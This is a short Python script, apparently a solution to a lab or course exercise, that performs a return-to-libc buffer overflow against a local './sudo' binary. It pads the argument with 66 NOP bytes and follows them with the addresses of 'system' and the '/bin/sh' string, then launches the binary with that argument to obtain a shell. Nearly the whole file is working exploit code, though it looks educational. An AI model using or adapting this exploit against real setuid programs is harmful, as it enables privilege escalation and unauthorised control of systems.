import os, sys
import addresses


PATH_TO_SUDO = './sudo'


def get_arg():
    # NOTES:
    # 1. Use `addresses.SYSTEM` to get the address of the `system` function
    # 2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    offset = 66
    nop = '\x90'
    return nop * offset + addresses.address_to_bytes(addresses.SYSTEM) + nop * 4 + addresses.address_to_bytes(addresses.LIBC_BIN_SH)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
